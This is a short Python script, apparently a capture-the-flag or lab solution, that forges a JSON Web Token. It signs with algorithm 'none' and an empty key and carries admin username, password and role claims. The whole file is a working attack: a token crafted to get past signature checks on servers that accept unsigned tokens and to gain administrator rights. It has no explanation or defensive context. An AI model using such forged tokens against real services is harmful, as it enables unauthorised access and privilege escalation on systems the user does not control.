import jwt

payload={
  "username": "admin",
  "password": "admin",
  "role": "admin"
}
token = jwt.encode(payload,algorithm="none",key="")
print(token)